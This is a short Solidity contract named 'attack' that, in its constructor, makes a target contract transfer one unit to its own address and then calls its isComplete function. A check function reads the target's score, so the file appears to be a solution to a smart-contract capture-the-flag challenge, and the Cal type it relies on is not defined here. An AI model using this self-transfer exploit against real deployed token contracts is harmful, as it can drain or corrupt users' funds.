// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
contract attack{
    Cal public tar;
    constructor(address t)public{
        tar=Cal(t);
        tar.transfer(address(tar),1);
        tar.isComplete();
    }
    function check()public view returns(uint){
        return tar.score();
    }
}